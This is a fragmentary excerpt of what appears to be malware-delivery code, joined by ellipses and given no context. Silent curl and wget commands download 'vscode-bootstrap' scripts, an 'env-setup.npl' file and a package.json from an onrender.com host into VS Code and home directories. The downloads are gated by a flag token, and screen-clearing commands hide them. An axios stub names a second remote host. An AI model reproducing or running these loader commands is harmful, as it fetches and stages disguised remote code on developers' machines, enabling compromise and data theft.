...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitcheckout-t5jm.onrender.com/settings/bootstrap?flag=${flag}
cls
...
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitcheckout-t5jm.onrender.com/settings/bootstraplinux?flag=${flag}"
clear
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitcheckout-t5jm.onrender.com/settings/bootstraplinux?flag=${flag}"
clear
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitcheckout-t5jm.onrender.com/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "https://gitcheckout-t5jm.onrender.com/settings/package"
...
mkdir -p "\${USER_HOME}"
BASE_URL="https://gitcheckout-t5jm.onrender.com"
...
`;
    ...
    if (!VALID_FLAGS.includes(flag)) {
      return res.status(403).send("Unauthorized token");
		...
		script = `
	const axios = require('axios');
const host = "checkmyip-rboq.onrender.com";
